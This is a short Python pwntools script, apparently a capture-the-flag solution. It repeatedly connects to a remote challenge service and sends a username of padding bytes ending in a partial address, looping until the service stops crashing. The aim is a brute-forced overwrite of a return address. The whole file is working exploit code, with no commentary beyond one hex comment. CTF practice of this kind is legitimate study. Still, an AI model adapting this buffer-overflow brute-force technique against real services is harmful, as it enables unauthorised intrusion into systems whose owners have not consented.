from pwn import *

# 0xbd0d06a
while True:
    with context.local(log_level = 'error'):
        p = remote('E05-target.allyourbases.co', 8140)
        p.sendlineafter(b'Username:', b'X' + b'\x0b' + b'X'*(59) + b'\x6a\xd0\xd0')
        res=p.recvlines(2)
        print(res)
        if b'Segmentation' not in res[0]:
            break
        p.close()